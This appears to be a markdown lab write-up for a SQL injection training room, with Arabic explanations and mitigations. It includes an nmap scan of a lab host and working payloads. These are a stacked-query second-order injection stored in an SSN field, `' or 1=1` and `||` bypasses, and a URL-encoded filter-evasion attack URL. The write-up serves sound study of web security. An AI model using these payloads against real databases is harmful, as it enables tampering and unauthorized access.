# Advanced SQL Injection

<details>
  <summary>Introduction</summary>

  > ﻿Throughout this room, you will gain a comprehensive understanding of the following key concepts:
- >> Second-order SQL injection 
- >> Filter evasion
- >> Out-of-band SQL Injection
- >> Automation techniques
- >> Mitigation measures

- > **``First``** scan
  >
  > ```
  > nmap -A -T4 -p 3306,3389,445,139,135 10.10.108.30
  > ```
  >

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-01 14:35 EDT
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 20.00% done; ETC: 14:36 (0:00:24 remaining)
Nmap scan report for 10.10.108.30
Host is up (0.11s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MariaDB 10.3.23 or earlier (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-05-01T18:36:10+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SQLi
| Not valid before: 2025-04-30T18:34:14
|_Not valid after:  2025-10-30T18:34:14
| rdp-ntlm-info: 
|   Target_Name: SQLI
|   NetBIOS_Domain_Name: SQLI
|   NetBIOS_Computer_Name: SQLI
|   DNS_Domain_Name: SQLi
|   DNS_Computer_Name: SQLi
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-01T18:36:00+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows 10 1903 (92%), Windows Server 2019 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows Vista SP1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-01T18:36:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   140.13 ms 10.8.0.1
2   127.52 ms 10.10.108.30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.57 seconds

```

- > mysql run on **``3306``**


</details>










--------------------------------------------------------------------------------------------------------------------------------------------------










<details>
  <summary>Recap</summary>

![image](https://github.com/user-attachments/assets/c6ced0d7-d8d3-4b5e-8aea-d80d42831e45)

  
</details>

--------------------------------------------------------------------------------------------------------------------------------------------------

<details>
  <summary>Second-Order SQL Injection</summary>

<details>
  <summary>GPT--explain</summary>
  
# Second-Order SQL Injection

Second-Order SQL Injection (SQLi) هو نوع من أنواع هجمات SQL التي لا يتم تنفيذها في لحظة إدخال البيانات كما هو الحال مع SQLi التقليدي. بدلاً من ذلك، يتم إدخال كود خبيث يُخزن بشكل طبيعي في قاعدة البيانات، ثم يُنفذ لاحقًا عند استخدام هذه البيانات في استعلام SQL جديد بدون حماية كافية.

---

## 🧠 مثال توضيحي

### 💾 1. صفحة `add.php` (إدخال البيانات)

المهاجم يدخل البيانات التالية:

- `SSN`: `12345'; UPDATE books SET book_name = 'Hacked'; --`
- `book_name`: `Normal Book`
- `author`: `John Doe`

الكود يُخزن كما هو داخل قاعدة البيانات دون تنفيذ أي أوامر SQL، لأنه لا يُستخدم في استعلام أثناء الإدخال.

---

### 🔁 2. صفحة `update.php` (استخدام البيانات لاحقًا)

الكود التالي يستخدم البيانات المخزنة:

```php
$update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
```

إذا كانت قيمة `$ssn` هي القيمة التي أدخلها المهاجم سابقًا، فإن هذا الاستعلام يصبح استعلامًا مركبًا يؤدي إلى تنفيذ الكود الخبيث.

### 💣 النتيجة

- يتم تنفيذ الأمر الثاني داخل الاستعلام: `UPDATE books SET book_name = 'Hacked';`
- أسماء كل الكتب في الجدول قد تتغير إلى "Hacked".

---

## ⚠️ لماذا هذا النوع خطير؟

- يمر من عمليات الفلترة التقليدية مثل `real_escape_string()`.
- لا يسبب مشاكل ظاهرة وقت الإدخال، مما يجعله صعب الاكتشاف.
- يتم تنفيذه في وقت لاحق في مكان مختلف في الكود.

---

## 🔐 كيف نحمي التطبيق؟

### ✅ استخدام Prepared Statements (الاستعلامات المجهزة)

```php
$stmt = $conn->prepare("UPDATE books SET book_name = ?, author = ? WHERE ssn = ?");
$stmt->bind_param("sss", $book_name, $author, $ssn);
$stmt->execute();
```

### ✅ فلترة البيانات عند الإدخال **وعند الاستخدام**

- لا تكتفِ بالتحقق عند الإدخال فقط.
- تحقق من صحة وسلامة البيانات قبل استخدامها في أي استعلام.

### ❌ تجنب استخدام `multi_query()` إن أمكن

- لأنه يسمح بتنفيذ أكثر من أمر SQL في استعلام واحد، مما يسهل تنفيذ الأكواد الخبيثة.

---

## 📊 تسلسل الهجوم (وصف توضيحي)

```
[User Input] --> (add.php) --> [Stored in DB] --> (update.php uses it unsafely) --> [SQL Injection Triggered]
```

---

Second-Order SQLi مثال قوي على أن الأمان لا يجب أن يعتمد فقط على الإدخال النظيف، بل أيضًا على كيفية استخدام البيانات لاحقًا.


</details>


- > first we will add new book on this ``http://10.10.84.232/second/add.php`` like this:
  > 
  > ![image](https://github.com/user-attachments/assets/4088c1e0-64fc-4dca-b5cf-cddffd17176c)
  > 
  > we make book ``SSN`` content ``12345'; UPDATE books SET book_name = 'Hacked'; --``
  > 
  > it will not excuted now
  >
  > now we open **``http://10.10.84.232/second/update.php``** and update content of this book
  >
  > ![image](https://github.com/user-attachments/assets/b03e0b64-42f6-405d-812d-5fb3be5888cf)
  >
  > if we go back to ``add.php`` will found all books name became **``hacked``**
  >
  > ![image](https://github.com/user-attachments/assets/6594fef7-009d-4cee-a91f-b68c82ce188b)
  >
  > we can also drop tables or any other sql queryies 




</details>

--------------------------------------------------------------------------------------------------------------------------------------------------


<details>
  <summary>Filter Evasion Techniques</summary>

<details>
  <summary>GPT--explain</summary>

# SQL Injection: Bypassing Weak Filters

## 🎯 الفكرة الأساسية
بعض المطورين يحاولون منع هجمات SQL Injection عن طريق فلترة كلمات خطيرة مثل `OR`, `AND`, `UNION`, `SELECT` من مدخلات المستخدم. لكن هذه الطريقة غير كافية ويمكن تجاوزها باستخدام تقنيات ترميز مختلفة.

---

## 🧱 مثال على كود ضعيف للحماية:

```php
$special_chars = array("OR", "or", "AND", "and" , "UNION", "SELECT");
$book_name = str_replace($special_chars, '', $book_name);
```

الكود يقوم بإزالة الكلمات المحظورة من المدخلات. فإذا أدخل المستخدم:
```
admin' OR 1=1
```
فإنها تتحول إلى:
```
admin' 1=1
```
وبالتالي قد يفشل الهجوم. لكن... 👇

---

## 💥 كيف يتجاوز الهاكر الفلترة؟

### ✅ 1. URL Encoding (ترميز الروابط)

الهجوم:
```
admin' OR 1=1 --
```
يُكتب كالتالي:
```
admin%27%20OR%201%3D1%20--+
```
الفلتر لا يتعرف على `%27` كعلامة اقتباس `'`، لكنها تُفك عند التنفيذ.

---

### ✅ 2. استخدام `||` بدل `OR`

في MySQL:
```sql
1' || 1=1 --+
```
`||` تعمل كبديل لـ `OR`. الفلتر لا يراها خطيرة لكنها تؤدي نفس الغرض.

---

### ✅ 3. Hex Encoding (الترميز بالـ Hex)

كلمة `admin` يمكن كتابتها كالتالي:
```sql
0x61646d696e
```
إذا حاول الفلتر منع كلمة "admin"، هذا الترميز سيتجاوز الحظر.

---

### ✅ 4. Unicode Encoding (الترميز الموحد)

مثال:
```
\u0061\u0064\u006d\u0069\u006e  →  admin
```
بعض البيئات تقوم بتفسير الترميز وتحويله للنص الأصلي تلقائيًا.

---

## 👨‍💻 تطبيقات واقعية معرضة للخطر

- مواقع البحث في الكتب أو المنتجات.
- صفحات تسجيل الدخول واسترجاع كلمات المرور.
- أي نموذج إدخال يعتمد على كلمات يتم فلترتها سطحيًا.

---

## 🛡️ كيف تحمي تطبيقك كمطور؟

- ✅ **استخدم Prepared Statements (استعلامات مجهزة مسبقًا):**
  - تمنع تنفيذ الكود الخبيث مهما كانت طريقة ترميزه.

- ❌ **لا تعتمد على `str_replace` أو Regex فقط:**
  - الترميز قد يخدع هذه الطرق بسهولة.

- 🧠 **افهم أن الترميز لا يغير نية المدخلات:**
  - قاعدة البيانات ستفك الترميز وتنفذ الأوامر.

---

الحماية الحقيقية تأتي من تصميم استعلاماتك بشكل آمن، وليس من مجرد إزالة كلمات معينة من إدخال المستخدم.


  
</details>


- > firts open ``http://10.10.84.232/encoding/``
  >
  > try to use for exmaple ``' or 1=1; --`` this will appear
  >
  > ![image](https://github.com/user-attachments/assets/891418fc-62fd-415a-b15a-bdb20dc11faf)
  >
  > so now will go to burpsuit and send request to ``repeater``
  >
  > and select the input and do url encode to it by click ``ctrl`` **+** ``U``
  >
  > ![image](https://github.com/user-attachments/assets/181147f7-3764-438a-9c65-9fab015278a7)
  >
  > ```
  > http://10.10.84.232/encoding/search_books.php?book_name=intro+to+php%27+||+1%3d1+--+
  > ```




</details>

--------------------------------------------------------------------------------------------------------------------------------------------------


<details>
  <summary>Introduction</summary>
</details>

--------------------------------------------------------------------------------------------------------------------------------------------------



<details>
  <summary>Introduction</summary>
</details>

--------------------------------------------------------------------------------------------------------------------------------------------------



<details>
  <summary>Introduction</summary>
</details>

--------------------------------------------------------------------------------------------------------------------------------------------------




<details>
  <summary>Introduction</summary>
</details>

--------------------------------------------------------------------------------------------------------------------------------------------------




<details>
  <summary>Introduction</summary>
</details>

--------------------------------------------------------------------------------------------------------------------------------------------------





